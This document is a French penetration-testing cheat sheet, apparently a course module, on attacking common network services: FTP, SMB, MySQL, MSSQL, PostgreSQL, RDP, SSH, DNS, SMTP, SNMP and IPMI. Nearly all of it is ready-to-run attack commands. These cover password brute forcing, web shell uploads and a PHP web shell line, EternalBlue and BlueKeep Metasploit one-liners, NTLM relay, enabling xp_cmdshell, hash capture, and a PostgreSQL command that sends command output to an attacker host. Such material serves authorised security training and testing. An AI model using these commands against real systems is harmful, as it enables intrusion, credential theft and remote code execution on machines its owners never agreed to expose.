# 11 — Attacking Common Services

## Objectifs
Exploiter les services d'infrastructure : FTP, SMB, SQL, RDP, SSH, DNS, SMTP, SNMP, IPMI — au-delà de l'énumération, jusqu'à l'exécution de commandes et la compromission.

---

## 1. FTP

```bash
# Anonymous
ftp <TARGET>            # anonymous / anonymous
wget -m --no-passive ftp://anonymous:anonymous@<TARGET>

# Écriture → upload de web shell si le répertoire est servi par HTTP
put shell.php

# Brute force
hydra -L users.txt -P <WORDLIST> ftp://<TARGET>

# vsftpd 2.3.4 backdoor
searchsploit vsftpd 2.3.4
# Connexion avec un username contenant ":)" → shell sur le port 6200
nc <TARGET> 6200
```

---

## 2. SMB — exploitation

```bash
# Énumération
netexec smb <TARGET> -u '' -p '' --shares
enum4linux-ng -A <TARGET>

# Accès en écriture → dépôt de fichier malveillant
smbclient //<TARGET>/<SHARE> -U '<USER>%<PASS>'
put shell.exe

# Exécution à distance (admin requis)
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-smbexec <DOMAIN>/<USER>:<PASS>@<TARGET>
netexec smb <TARGET> -u <USER> -p <PASS> -x 'whoami'
netexec smb <TARGET> -u <USER> -p <PASS> -X '$PSVersionTable'

# Vulnérabilités
nmap -p445 --script smb-vuln-* <TARGET>
# MS17-010 (EternalBlue)
msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS <TARGET>; set LHOST <LHOST>; run"
# SMBGhost (CVE-2020-0796)
# PrintNightmare (CVE-2021-1675)
```

### SMB relay
```bash
sudo responder -I tun0
impacket-ntlmrelayx -tf targets.txt -smb2support -socks
```

---

## 3. SQL — exploitation

### MySQL
```bash
mysql -u <USER> -p<PASS> -h <TARGET>
# Lecture de fichiers
SELECT LOAD_FILE('/etc/passwd');
# Écriture (si FILE priv + secure_file_priv vide)
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
# UDF / privesc
```

### MSSQL
```bash
impacket-mssqlclient <DOMAIN>/<USER>:<PASS>@<TARGET> -windows-auth
```
```sql
-- Droits
SELECT IS_SRVROLEMEMBER('sysadmin');
-- xp_cmdshell
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- Lecture/écriture de fichiers
SELECT * FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) AS x;
-- Liens serveur
SELECT * FROM sys.servers;
EXEC ('SELECT 1') AT [LINKED_SERVER];
-- Impersonation
SELECT distinct b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';
EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin');
```
```bash
# hashdump / relais
impacket-mssqlclient ... # puis EXEC master..xp_dirtree '\\<LHOST>\share'  → capture NetNTLM
```

### Oracle / PostgreSQL
```bash
# Oracle
odat all -s <TARGET> -p 1521 -d <SID> -U <USER> -P <PASS>
# PostgreSQL
psql -h <TARGET> -U <USER> -d <DB>
COPY (SELECT '') TO PROGRAM 'curl http://<LHOST>:8000/$(whoami)';   -- RCE si superuser
```

---

## 4. RDP

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /cert:ignore /dynamic-resolution /drive:share,/srv/tools
rdesktop -u <USER> -p <PASS> <TARGET>

# BlueKeep (CVE-2019-0708)
msfconsole -q -x "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; set RHOSTS <TARGET>; run"

# RDP session hijack (SYSTEM)
tscon <SESSION_ID> /dest:rdp-tcp#0

# Vérifier NLA
nmap -p3389 --script rdp-enum-encryption,rdp-ntlm-info <TARGET>
```

---

## 5. SSH

```bash
ssh <USER>@<TARGET>
ssh -i id_rsa <USER>@<TARGET>

# Clé trouvée → passphrase
ssh2john id_rsa > h && john h --wordlist=<WORDLIST>

# Brute force
hydra -L users.txt -P <WORDLIST> ssh://<TARGET> -t 4 -f

# Tunnels (voir module 12)
ssh -D 1080 <USER>@<TARGET>
ssh -L 8080:127.0.0.1:80 <USER>@<TARGET>

# Agent forwarding / hijack
echo $SSH_AUTH_SOCK
ssh-add -l
```

---

## 6. DNS

```bash
# AXFR
dig axfr <DOMAIN> @<TARGET>

# Cache snooping
dig +norecurse @<TARGET> <DOMAIN>

# Sous-domaines / brute
dnsenum <DOMAIN>
dnsrecon -d <DOMAIN> -t brt -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

# Attaque : DNS rebinding / spoofing (lab)
```

---

## 7. SMTP

```bash
# Énumération d'utilisateurs
smtp-user-enum -M VRFY -U users.txt -t <TARGET>
smtp-user-enum -M RCPT -U users.txt -t <TARGET> -D <DOMAIN>

# Relais ouvert
nmap -p25 --script smtp-open-relay <TARGET>
# Test manuel
swaks --to victim@<DOMAIN> --from ceo@<DOMAIN> --server <TARGET> --body "test"

# Phishing (autorisé uniquement)
```

---

## 8. SNMP

```bash
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt <TARGET>
snmpwalk -v2c -c public <TARGET>
snmp-check <TARGET> -c public

# Extraire des credentials dans les OID
snmpwalk -v2c -c public <TARGET> 1.3.6.1.4.1.77.1.2.25
snmpwalk -v2c -c public <TARGET> 1.3.6.1.2.1.25.4.2.1.2

# Écriture (rare, community rw)
snmpset -v2c -c private <TARGET> <OID> s "value"
```

---

## 9. IPMI

```bash
nmap -sU -p623 --script ipmi-version <TARGET>
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <TARGET>; run"
hashcat -m 7300 hash.txt <WORDLIST>

# Connexion BMC
ipmitool -I lanplus -H <TARGET> -U <USER> -P <PASS> chassis status
ipmitool -I lanplus -H <TARGET> -U <USER> -P <PASS> sol activate
```

> Le hash RAKP (mode 2) est souvent crackable → accès admin au BMC, potentiellement réinitialisation du serveur.

---

## 10. Tableau d'exploitation rapide

| Service | Vecteur | Outil |
|---|---|---|
| FTP | anonymous / write / vsftpd 2.3.4 | ftp, hydra |
| SMB | null session, relay, MS17-010 | netexec, impacket |
| MSSQL | xp_cmdshell, impersonation | mssqlclient |
| MySQL | OUTFILE, UDF | mysql |
| RDP | BlueKeep, creds | xfreerdp, msf |
| SSH | clés, brute force | hydra, john |
| SMTP | VRFY, relais | smtp-user-enum |
| SNMP | community public | snmpwalk |
| IPMI | hash RAKP | msf, hashcat |

## Checklist
- [ ] Chaque service a été testé avec creds par défaut ET anonyme
- [ ] Versions comparées aux CVE
- [ ] Écriture de fichiers testée (FTP, SMB, SQL)
- [ ] Exécution de commandes tentée là où c'est possible
- [ ] Credentials collectés réutilisés
